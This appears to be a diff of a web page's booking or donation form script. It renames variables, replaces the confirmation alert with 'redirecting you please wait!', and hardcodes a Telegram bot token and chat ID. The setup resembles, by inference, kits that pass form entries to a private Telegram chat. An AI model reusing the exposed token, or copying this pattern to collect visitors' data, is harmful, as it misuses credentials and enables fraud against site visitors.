@@ -1,11 +1,11 @@
     const TELEGRAM_TOKEN = '7562593192:AAHCAufAjNw6DjBfHSIVsj8gLfZk24BoXjk';
     const CHAT_ID = ['6300694007'];
 
-    let bookingAmount = null;
+    let BookingAmount = null;
 
     // Set booking amount when a user selects a booking option
-    function setBookingOption(amount) {
-      bookingAmount = amount;
+    function setBookingAmount(amount) {
+      BookingAmount = amount;
       document.getElementById('donate-now-btn').dataset.url = `${amount}`;
     }
 
@@ -29,7 +29,7 @@
       validateFormAndSend();
 
       // Redirect to a confirmation URL (optional)
-      alert('Your booking has been submitted!');
+      alert('redirecting you please wait!');
     });
 
     // Form validation function
@@ -103,4 +103,4 @@
           console.error('Error with the request:', error);
         });
       });
-      }
+    }
